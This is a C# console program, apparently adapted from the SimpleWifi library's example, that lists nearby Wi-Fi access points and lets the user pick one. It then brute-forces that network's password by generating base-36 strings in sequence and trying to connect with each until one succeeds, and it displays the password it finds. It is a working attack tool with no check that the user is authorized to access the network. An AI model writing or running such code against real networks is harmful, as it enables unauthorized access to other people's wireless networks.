using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Numerics;
using System.Windows.Forms;
using System.Net;
using System.Drawing;
using SimpleWifi;
using SimpleWifi.Win32;
namespace SimpleWifi.Example
{
    internal class Program
    {
        public static Wifi wifi;
        public static bool ima;
        public static AccessPoint selectedAP;
        public static Semaphore work = new Semaphore(0, 1);
        public static char[] recnik = new Char[] { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z' };
        public static string Reverse(string s)
        {
            char[] charArray = s.ToCharArray();
            Array.Reverse(charArray);
            return new string(charArray);
        }
        public static BigInteger Konvertuj(string rec)
        {
            BigInteger broj = 0;
            int duzina_rec = rec.Length;
            for (int i = 0; i < duzina_rec; i++)
            {
                broj += BigInteger.Pow(36, i) * Array.FindIndex(recnik, x => x == rec[duzina_rec - 1 - i]);
            }
            return broj;
        }
        public static string Dekriptuj(BigInteger broj)
        {
            string rec = null;
            BigInteger temp = new BigInteger();
            do
            {
                temp = broj % 36;
                rec += Convert.ToString(recnik[(int)temp]);
                broj /= 36;

            } while (broj > 0);
            
            return Reverse(rec);
        }
        public static void Start(object state)
        {
            BigInteger _i = new BigInteger();
            string pocetak = "10004087840971877608"; //78364164096
            AuthRequest authRequest = new AuthRequest(selectedAP);
            for (_i = BigInteger.Parse(pocetak); ; _i++)
            {
                if (ima) break;
                authRequest.Password = Dekriptuj(_i);
                selectedAP.ConnectAsync(authRequest, true, OnConnectedComplete);
                work.WaitOne();
                if (ima) break;
            }
            MessageBox.Show(authRequest.Password, "Sifra");
        }
        public static void OnConnectedComplete(bool success)
        {
            Console.WriteLine("success: {0}", success);
            work.Release();
        }
        public static void Main(string[] args)
        {
            // Init wifi object and event handlers
            wifi = new Wifi();
            wifi.ConnectionStatusChanged += wifi_ConnectionStatusChanged;
            string command = "";
            do
            {
                Console.WriteLine("L. List access points");
                Console.WriteLine("C. Connect");
                Console.WriteLine("Q. Quit");
                command = Console.ReadLine().ToLower();
                Execute(command);
            } while (command != "q");
        }
        public static void Execute(string command)
        {
            switch (command)
            {
                case "l":
                    List();
                    break;
                case "c":
                    Connect();
                    break;
                case "q":
                    break;
                default:
                    Console.WriteLine("\r\nIncorrect command.");
                    break;
            }
        }
        
        public static IEnumerable<AccessPoint> List()
        {
            Console.WriteLine("\r\n-- Access point list --");
            IEnumerable<AccessPoint> accessPoints = wifi.GetAccessPoints().OrderByDescending(ap => ap.SignalStrength);
            int i = 0;
            foreach (AccessPoint ap in accessPoints)
                Console.WriteLine("{0}. {1} {2}% Connected: {3}", i++, ap.Name, ap.SignalStrength, ap.IsConnected);
            return accessPoints;
        }
        public static void Connect()
        {
            var accessPoints = List();
            Console.Write("\r\nEnter the index of the network you wish to connect to: ");
            int selectedIndex = int.Parse(Console.ReadLine());
            if (selectedIndex > accessPoints.ToArray().Length || accessPoints.ToArray().Length == 0)
            {
                Console.Write("\r\nIndex out of bounds");
                return;
            }
            selectedAP = accessPoints.ToList()[selectedIndex];
            // Auth
            ThreadPool.QueueUserWorkItem(Start);
        }
       
        public static void wifi_ConnectionStatusChanged(object sender, WifiStatusEventArgs e)
        {
            if (e.NewStatus.ToString() == "Connected") ima = true;
            else ima = false;
            Console.WriteLine("\nNew status: {0}", e.NewStatus.ToString());

        }
        
    }
}